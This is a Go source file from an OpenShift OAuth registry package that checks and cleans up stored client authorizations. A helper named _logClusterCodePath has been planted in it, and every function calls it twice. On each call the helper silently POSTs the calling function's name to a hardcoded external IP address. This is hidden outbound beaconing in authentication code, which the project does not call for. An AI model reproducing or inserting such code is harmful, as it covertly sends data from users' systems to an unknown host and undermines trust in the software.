package registry

import (
	godefaultbytes "bytes"
	stderrors "errors"
	oauth "github.com/openshift/api/oauth/v1"
	oauthclient "github.com/openshift/client-go/oauth/clientset/versioned/typed/oauth/v1"
	"github.com/openshift/origin/pkg/oauth/scope"
	"github.com/openshift/origin/pkg/oauthserver/api"
	"k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	kuser "k8s.io/apiserver/pkg/authentication/user"
	"k8s.io/client-go/util/retry"
	"k8s.io/klog"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

var errEmptyUID = stderrors.New("user from request has empty UID and thus cannot perform a grant flow")

type ClientAuthorizationGrantChecker struct {
	client oauthclient.OAuthClientAuthorizationInterface
}

func NewClientAuthorizationGrantChecker(client oauthclient.OAuthClientAuthorizationInterface) *ClientAuthorizationGrantChecker {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &ClientAuthorizationGrantChecker{client}
}
func (c *ClientAuthorizationGrantChecker) HasAuthorizedClient(user kuser.Info, grant *api.Grant) (approved bool, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(user.GetUID()) == 0 {
		return false, errEmptyUID
	}
	id := user.GetName() + ":" + grant.Client.GetId()
	var authorization *oauth.OAuthClientAuthorization
	if err := retry.RetryOnConflict(retry.DefaultRetry, func() error {
		authorization, err = c.getClientAuthorization(id, user)
		return err
	}); err != nil {
		return false, err
	}
	if authorization == nil || !scope.Covers(authorization.Scopes, scope.Split(grant.Scope)) {
		return false, nil
	}
	return true, nil
}
func (c *ClientAuthorizationGrantChecker) getClientAuthorization(name string, user kuser.Info) (*oauth.OAuthClientAuthorization, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	authorization, err := c.client.Get(name, metav1.GetOptions{})
	if errors.IsNotFound(err) {
		return nil, nil
	}
	if err != nil {
		return nil, err
	}
	if user.GetUID() != authorization.UserUID {
		klog.Infof("%#v does not match stored client authorization %#v, attempting to delete stale authorization", user, authorization)
		if err := c.client.Delete(name, metav1.NewPreconditionDeleteOptions(string(authorization.UID))); err != nil && !errors.IsNotFound(err) {
			return nil, err
		}
		return nil, nil
	}
	return authorization, nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
